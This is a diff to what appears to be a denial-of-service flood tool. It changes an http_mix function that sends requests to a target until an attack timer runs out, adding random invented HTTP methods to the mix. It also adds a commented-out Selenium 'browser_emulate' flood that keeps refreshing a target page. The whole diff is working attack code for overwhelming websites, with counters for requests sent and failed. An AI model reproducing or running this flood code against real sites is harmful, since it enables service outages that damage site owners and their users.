@@ -189,7 +189,7 @@ def http_mix(worker_id, session, target_url, attack_duration, useragent=None, re
     stoptime = time.time() + attack_duration
     while time.time() < stoptime and Core.attackrunning:
         try:
-            methods = ['GET', 'POST', 'HEAD', 'PATCH', 'DELETE', 'PUT', 'TRACE', 'CONNECT', 'OPTIONS']
+            methods = ['GET', 'POST', 'HEAD', 'PATCH', 'DELETE', 'PUT', 'TRACE', 'CONNECT', 'OPTIONS', randstr(randint(2,6)).upper()]
             shuffle(methods)
             method = choice(methods)
             headers = buildheaders(target_url, useragent, referer)
@@ -206,3 +206,30 @@ def http_mix(worker_id, session, target_url, attack_duration, useragent=None, re
             Core.infodict[worker_id]['req_fail'] += 1
         Core.infodict[worker_id]['req_total'] += 1
     Core.threadcount -= 1
+
+'''
+def browser_emulate(worker_id, target_url, attack_duration, useragent=None):
+    \'''
+    Flood which uses Selenium and a specified browser driver to constantly refresh a page
+    \'''
+
+    if target_url is None:
+        return False
+
+    time.sleep(5)
+
+    driver = getdriver(useragent)
+    driver.get(target_url)
+
+    stoptime = time.time() + attack_duration
+    while time.time() < stoptime and Core.attackrunning:
+        try:
+            driver.refresh()
+            Core.infodict[worker_id]['req_sent'] += 1
+        except Exception:
+            Core.infodict[worker_id]['req_fail'] += 1
+        Core.infodict[worker_id]['req_total'] += 1
+    Core.threadcount -= 1
+
+    driver.close()
+'''
